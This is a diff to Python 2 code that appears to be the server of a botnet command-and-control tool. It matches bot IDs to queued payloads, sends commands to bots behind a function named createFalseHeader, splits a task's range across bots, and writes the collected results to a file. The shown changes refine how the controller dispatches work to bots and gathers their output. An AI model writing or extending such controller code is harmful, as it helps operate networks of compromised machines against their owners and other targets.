@@ -125,12 +125,11 @@ def checkIfIsTarget(botId, payloads):
     logging.debug("Checking if is target")
     for p in payloads:
         logging.debug("Checking payload: " + p.ID)
-        logging.debug("Targets: " + str(len(p.targets)))
+        logging.debug("Targets: " + str(len(p.getTargets())))
         if botId in p.getTargets() and botId not in p.results:
             logging.debug("Is in " + p.ID)
             return p
     return ''
-
 def communicate(conn, address, payloadProxy, BOTS, finished):
     logging.debug("Accepted connection.")
     payloads = payloadProxy[0]
@@ -177,6 +176,10 @@ def communicate(conn, address, payloadProxy, BOTS, finished):
                                 p.addResult(botId, decoded)
                                 if len(p.getTargets()) == len(p.getResults()):
                                     finished.append(p)
+                                    logging.debug("Writing to file")
+                                    with open(p.ID+".res", 'w') as f:
+                                        print >> f, p.getResults()
+                                        #f.write(p.getResults())
                                     try:
                                         payloads.remove(p)
                                     except Exception, e:
@@ -199,6 +202,7 @@ def communicate(conn, address, payloadProxy, BOTS, finished):
                             tempcommand = p.command
                             logging.debug("tempcommand = " + str(botlist))
                             for botindex, bot in enumerate(botlist):
+                                if botId != bot: continue
                                 p.command = tempcommand
                                 for line in tempcommand.split('\n'):
                                     #grab lines
@@ -212,14 +216,13 @@ def communicate(conn, address, payloadProxy, BOTS, finished):
                                     logging.debug("botindex1 " + str(partitionint*botindex))
                                     t = ""
                                     t = "\ntlow = {}\nthigh = {}\n".format(str(partitionint*botindex), str((botindex+1)*partitionint-1))
-                                    logging.debug("pitttt = " + t)
-                                    logging.debug("command1 = " + p.command)
                                     p.command = tempcommand + t
-                                    logging.debug("command2 = " + p.command)
                                     full_command = genCommandFromPayload(p)
                                     response = createFalseHeader(len(full_command), full_command)
                                     logging.debug("Sending Response: " + response)
                                     conn.send(response)
+                                    break
+                            p.command = tempcommand
                         else:            
                             full_command = genCommandFromPayload(p)
                             response = createFalseHeader(len(full_command), full_command)
